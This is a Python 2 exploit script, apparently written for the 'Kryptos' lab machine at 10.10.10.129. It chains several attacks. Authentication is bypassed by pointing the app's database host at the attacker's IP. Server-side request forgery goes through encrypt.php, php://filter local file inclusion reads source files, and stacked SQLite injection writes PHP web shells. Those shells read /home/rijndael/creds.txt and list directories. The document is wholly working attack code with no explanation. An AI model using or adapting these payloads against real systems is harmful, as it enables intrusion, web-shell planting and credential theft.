import requests
import urllib
import random
from bs4 import BeautifulSoup
from time import sleep
import netifaces as ni
from base64 import b64decode

url = 'http://10.10.10.129'
ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
r = requests.get(url)
cookie = r.headers['Set-Cookie'].split(';')[0].split('=')[1]
token = BeautifulSoup(r.text,'lxml')
token = token.find('input',{'name':'token'})['value']

def req():
	payload = raw_input('File> ')
	payload = '''http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource={}'''.format(payload)
	dump(payload)

def dump(payload):
	r = requests.post(url,data={'username':'admin','password':'admin','db':'cryptor;host={}'.format(ip),'token':token,'login':' '}, cookies={'PHPSESSID':cookie}, proxies={'http':'http://127.0.0.1:8080'})
	r = requests.get(url+'/encrypt.php?cipher=RC4&url={}'.format(payload),cookies={'PHPSESSID':cookie},proxies={'http':'http://127.0.0.1:8080'})
	msg = BeautifulSoup(r.text,'lxml')
	msg = msg.find('textarea',{'name':'textarea'}).text
	msg = b64decode(msg)
	with open('output.txt','w') as f:
		f.write(msg)
		f.close()
	r = requests.get(url+'/encrypt.php?cipher=RC4&url=http://{}/output.txt'.format(ip),cookies={'PHPSESSID':cookie},proxies={'http':'http://127.0.0.1:8080'})
	msg = BeautifulSoup(r.text,'lxml')
	msg = msg.find('textarea',{'name':'textarea'}).text
	msg = b64decode(msg)
	out = BeautifulSoup(msg,'lxml')
	if out.find('div'):
		out = out.find('div')
		out = out.next_sibling
		print b64decode(out)
	else:
		print msg

def file():
	payload = raw_input('Filename: ')
	file = random.randint(1,10000)
#	payload = urllib.quote_plus('''attach database 'd9e28afcf0b274a5e0542abb67db0784/{}.php' as test;create table test.testing(data text);insert into test.testing values('<?php print_r(file_get_contents("{}"));?>');-- '''.format(file,payload))
	payload = urllib.quote_plus('''attach database 'd9e28afcf0b274a5e0542abb67db0784/{}.php' as test;create table test.testing(data text);insert into test.testing values('<?php print_r(base64_encode(file_get_contents("/home/rijndael/creds.txt")));?>');-- '''.format(file,payload))
	payload = urllib.quote_plus('''http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1;{}'''.format(payload))
	print payload
	dump(payload)
	sleep(4)
	payload = '''http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/{}.php'''.format(file)
	dump(payload)

def dir():
        payload = raw_input('Dir: ')
        file = random.randint(1,10000)
        payload = urllib.quote_plus('''attach database 'd9e28afcf0b274a5e0542abb67db0784/{}.php' as test;create table test.testing(data text);insert into test.testing values('<?php print_r(scandir("{}"));?>');-- '''.format(file,payload))
        payload = urllib.quote_plus('''http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1;{}'''.format(payload))
        print payload
        dump(payload)
        sleep(4)
        payload = '''http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/{}.php'''.format(file)
        dump(payload) 



if __name__=="__main__":
	print "Kryptos..."
	print "1. View Source"
	print "2. File access"
	print "3. Dir"
	input = raw_input('> ').strip()
	if input == "1":
		req()
	elif input == "2":
		file()
	else:
		dir()
